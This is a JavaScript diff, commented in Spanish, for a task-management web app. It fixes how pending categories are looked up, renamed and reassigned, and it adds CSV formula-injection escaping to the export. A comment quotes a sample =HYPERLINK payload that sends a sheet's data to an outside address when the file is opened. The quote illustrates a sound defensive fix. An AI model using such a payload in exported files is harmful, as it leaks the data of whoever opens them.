@@ -16993,11 +16993,23 @@
         return normalized;
       }
 
+      // manualPendingCategories vive solo en este navegador. Una categoría creada por la otra
+      // persona llega pegada a sus tareas, no en esa lista, así que buscarla solo ahí devolvía
+      // null: renombrarla fabricaba una categoría nueva con el mismo id y perdía el responsable,
+      // y cambiarle el responsable perdía el título. Por eso se busca también dentro de las
+      // tareas, que es donde está lo que vino de fuera.
       function pendingCategoryById(id, groups = []) {
         const categoryId = String(id || "");
+        if (!categoryId) return null;
         const fromGroup = groups.find((group) => group.category?.id === categoryId)?.category;
         if (fromGroup) return fromGroup;
-        return manualPendingCategories.find((category) => category.id === categoryId) || null;
+        const local = manualPendingCategories.find((category) => category.id === categoryId);
+        if (local) return local;
+        for (const task of tasks) {
+          const category = pendingTaskCategory(task);
+          if (category?.id === categoryId) return category;
+        }
+        return null;
       }
 
       function pendingCategoryMeta(category, groupTasks) {
@@ -17007,7 +17019,11 @@
       }
 
       function renamePendingCategory(categoryId, title) {
-        const category = normalizePendingCategory(pendingCategoryById(categoryId), { id: categoryId });
+        const existente = pendingCategoryById(categoryId);
+        // Si no existe, no se inventa: antes se creaba una categoría nueva con ese id y el
+        // cambio parecía funcionar hasta que se recargaba.
+        if (!existente) return false;
+        const category = normalizePendingCategory(existente, { id: categoryId });
         const nextCategory = normalizePendingCategory({ ...category, title });
         if (!nextCategory) return false;
         upsertPendingCategory(nextCategory);
@@ -17020,7 +17036,9 @@
       }
 
       function updatePendingCategoryResponsible(categoryId, responsibleLabel) {
-        const category = normalizePendingCategory(pendingCategoryById(categoryId), { id: categoryId });
+        const existente = pendingCategoryById(categoryId);
+        if (!existente) return false;
+        const category = normalizePendingCategory(existente, { id: categoryId });
         if (!category) return false;
         const nextCategory = upsertPendingCategory({
           ...category,
@@ -17060,34 +17078,6 @@
         (input.closest("label") || input.parentElement || form).appendChild(error);
         input.addEventListener("input", () => clearFormFieldError(input), { once: true });
         input.focus();
-      }
-
-      function addPendingCategory(form) {
-        const formData = new FormData(form);
-        const title = String(formData.get("title") || "").trim();
-        const owner = String(formData.get("owner") || "").trim() || currentSuiteUserName();
-        const startDate = String(formData.get("startDate") || "").trim() || localDayKey();
-        const dueDate = String(formData.get("dueDate") || "").trim();
-        const priority = String(formData.get("priority") || "Media").trim() || "Media";
-
-        if (!title) {
-          showFormFieldError(form, "title", "Escribe el nombre de la categoria.");
-          return false;
-        }
-
-        const category = normalizePendingCategory({
-          id: generatedTaskId("category"),
-          title,
-          owner,
-          responsibleLabel: owner ? `Responsables: ${owner}` : "",
-          startDate,
-          dueDate,
-          priority,
-          color: criticalRoutePalette[manualPendingCategories.length % criticalRoutePalette.length],
-          createdAt: new Date().toISOString()
-        });
-        upsertPendingCategory(category);
-        return true;
       }
 
       function pendingManualCategoryGroups(visibleTasks) {
@@ -18256,8 +18246,16 @@
       }
 
 
+      // Excel y Google Sheets tratan como fórmula cualquier celda que empiece por =, +, - o @, y
+      // lo hacen aunque venga entre comillas. Un título de pendiente como
+      // =HYPERLINK("http://sitio/?"&A1,"Haz clic") se ejecuta al abrir el archivo descargado, con
+      // los datos de la hoja de quien lo abre. Un apóstrofo delante lo deja en texto, y Excel no
+      // lo muestra. La tabulación y el retorno de carro van por lo mismo: algunos lectores los
+      // usan para partir la celda.
       function csvCell(value) {
-        return '"' + String(value ?? "").replace(/"/g, '""') + '"';
+        let texto = String(value ?? "");
+        if (/^[=+\-@\t\r]/.test(texto)) texto = "'" + texto;
+        return '"' + texto.replace(/"/g, '""') + '"';
       }
 
       function downloadCompletedTasksTable() {
